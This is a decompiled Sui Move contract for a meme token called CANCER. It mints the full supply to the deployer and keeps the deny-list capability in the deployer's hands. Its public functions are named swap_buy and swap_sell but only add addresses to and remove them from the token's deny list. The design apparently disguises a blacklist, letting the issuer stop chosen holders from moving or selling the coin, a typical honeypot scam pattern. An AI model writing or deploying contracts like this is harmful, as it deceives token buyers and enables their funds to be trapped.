module 0x4ba036bd91bad81452fb5764820a4121809927347823f52853d80a4777955575::cancer {
    struct CANCER has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CANCER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CANCER>(arg0, 9, b"CANCER", b"F*CK CANCER", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmbx1xZkdXB9dSG1hpDAeE9BwJasuJaAg93GuTKLuzP7Zk"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CANCER>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CANCER>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CANCER>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CANCER>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CANCER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CANCER>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CANCER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CANCER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

